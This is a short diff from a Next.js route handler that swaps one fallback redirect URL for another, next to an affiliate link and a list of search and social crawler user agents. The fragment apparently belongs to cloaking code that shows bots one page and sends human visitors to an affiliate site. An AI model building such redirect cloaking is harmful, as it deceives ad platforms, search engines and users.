@@ -14,7 +14,7 @@ export async function GET(request: NextRequest) {
 
   // Redirect URLs
   const affiliateLink = "https://muikwu.com/"
-  const fallbackLink = "https://app.netlify.app/"
+  const fallbackLink = "https://nbd.news/news/2899/"
 
   // Check if visitor is a bot
   const bots = ["facebookexternalhit", "Facebot", "Googlebot", "crawler", "bot", "slurp", "spider"]
